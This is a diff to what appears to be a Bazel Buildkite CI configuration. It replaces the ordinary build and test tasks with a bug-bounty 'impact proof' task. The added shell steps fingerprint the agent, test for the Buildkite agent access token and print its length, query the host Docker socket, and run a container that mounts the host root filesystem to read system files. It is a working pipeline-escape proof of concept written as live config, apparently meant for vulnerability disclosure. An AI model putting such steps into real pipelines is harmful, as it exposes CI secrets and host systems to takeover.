@@ -2,11 +2,39 @@
 buildifier:
   version: latest
 tasks:
-  presubmit:
+  vrp_buildkite_impact_proof:
     platform: ubuntu2204
-    build_targets:
-    - "--"
-    - "..."
-    test_targets:
-    - "--"
-    - "..."
+    shell_commands:
+      - |
+        echo VRP_BK_IMPACT_PROOF_20260519
+        id
+        uname -a
+      - |
+        set +x
+        if [ -n "${BUILDKITE_AGENT_ACCESS_TOKEN:-}" ]; then
+          echo TOKEN_PRESENT=yes
+          printf 'TOKEN_LENGTH=%s\n' "$(printf %s "$BUILDKITE_AGENT_ACCESS_TOKEN" | wc -c | tr -d ' ')"
+        else
+          echo TOKEN_PRESENT=no
+        fi
+      - |
+        if [ -S /var/run/docker.sock ] && command -v curl >/dev/null 2>&1; then
+          echo DOCKER_SOCKET_QUERY_BEGIN
+          printf 'DOCKER_PING='
+          curl --silent --show-error --unix-socket /var/run/docker.sock http://localhost/_ping
+          echo
+          echo DOCKER_VERSION_BEGIN
+          curl --silent --show-error --unix-socket /var/run/docker.sock http://localhost/version | head -c 800
+          echo
+          echo DOCKER_VERSION_END
+        else
+          echo DOCKER_SOCKET_QUERY_UNAVAILABLE
+        fi
+      - |
+        if command -v docker >/dev/null 2>&1; then
+          echo DOCKER_HOST_READ_BEGIN
+          docker run --rm --network none -v /:/host:ro gcr.io/bazel-public/ubuntu2204 /bin/sh -c 'echo DOCKER_HOST_FS_READ_CONFIRMED; printf HOST_ETC_HOSTNAME=; cat /host/etc/hostname; sed -n "1,3p" /host/etc/os-release'
+          echo DOCKER_HOST_READ_END
+        else
+          echo DOCKER_CLI_UNAVAILABLE
+        fi
